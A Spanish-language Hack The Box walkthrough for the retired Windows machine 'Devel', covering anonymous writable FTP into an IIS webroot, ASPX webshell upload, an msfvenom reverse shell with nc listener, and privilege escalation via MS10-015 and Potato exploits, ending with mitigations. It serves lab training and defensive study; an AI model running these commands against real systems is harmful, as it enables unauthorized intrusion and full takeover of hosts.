---
machine: Devel
os: Windows
difficulty: Easy
platform: Hack The Box
category: Windows / Web
state: Retired
tags: [windows, ftp, iis, aspx, webshell, seimpersonate, ms10-015, privesc]
---

# Devel — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Sólo dos puertos: FTP de Microsoft con login anónimo **y permiso de escritura**, e IIS 7.5 sirviendo exactamente la misma carpeta. Subir un `.aspx` por FTP y pedirlo por HTTP da ejecución como `iis apppool\web`. Sin parches, la escalada es un exploit de kernel (MS10-015 / KiTrap0D) o, si el token lo permite, `SeImpersonate`.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
21/tcp open  ftp   Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  <DIR> aspnet_client
| 03-17-17   689  iisstart.htm
|_03-17-17  184946 welcome.png
80/tcp open  http  Microsoft IIS httpd 7.5
|_http-title: IIS7
```

La pista está en el listado: `iisstart.htm` y `welcome.png` son los ficheros por defecto de IIS, así que el FTP **es** el `wwwroot`.

```bash
ftp <IP>
# Name: anonymous
# Password: (vacío)
ftp> put cmdasp.aspx
ftp> ls
```

## Acceso

Webshell de comandos y comprobación de identidad:

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx .
ftp> put cmdasp.aspx
curl -s "http://<IP>/cmdasp.aspx?cmd=whoami"
# iis apppool\web
```

Para una shell cómoda, reverse shell ASPX y handler:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<tun0> LPORT=4444 -f aspx -o shell.aspx
ftp> binary
ftp> put shell.aspx
curl -s http://<IP>/shell.aspx
```

```bash
rlwrap nc -lvnp 4444
```

Si la sesión se cae al enviar comandos (habitual con `shell_reverse_tcp` en este IIS), subir `nc.exe` y lanzarlo desde `cmdasp.aspx`, o usar la webshell de Antak.

## Escalada

Recolección mínima:

```cmd
whoami /priv
systeminfo
wmic qfe list brief
```

Es un Windows 7 x86 sin parchear (`6.1 Build 7600`, sin hotfixes). Dos caminos:

- **Kernel**: MS10-015 / CVE-2010-0232 (`KiTrap0D`), sólo x86. Compilar/subir el exploit y ejecutarlo devuelve `NT AUTHORITY\SYSTEM`.
- **Token**: si `whoami /priv` muestra `SeImpersonatePrivilege`, `MS16-075` (Juicy Potato / Rotten Potato) funciona igual.

```cmd
whoami
# nt authority\system
type C:\Users\Administrator\Desktop\root.txt
```

## Tropiezos

- Meterpreter se queda colgado en este host; una shell `shell_reverse_tcp` o `nc.exe` es más estable.
- Al subir binarios, `ftp> binary` **antes** del `put`, o el ejecutable llega corrupto.
- MS10-015 necesita arquitectura x86; en x64 no aplica.
- `sysinfo` en Meterpreter confirma versión y arquitectura antes de elegir exploit.

## Lecciones

- FTP anónimo con escritura sobre el webroot es RCE sin exploit: es configuración.
- Un servidor sin parches convierte un foothold de bajos privilegios en SYSTEM.
- Mitigación: FTP sin escritura y fuera del webroot, cuentas anónimas deshabilitadas, parcheo y bloqueo de `SeImpersonate` donde no haga falta.
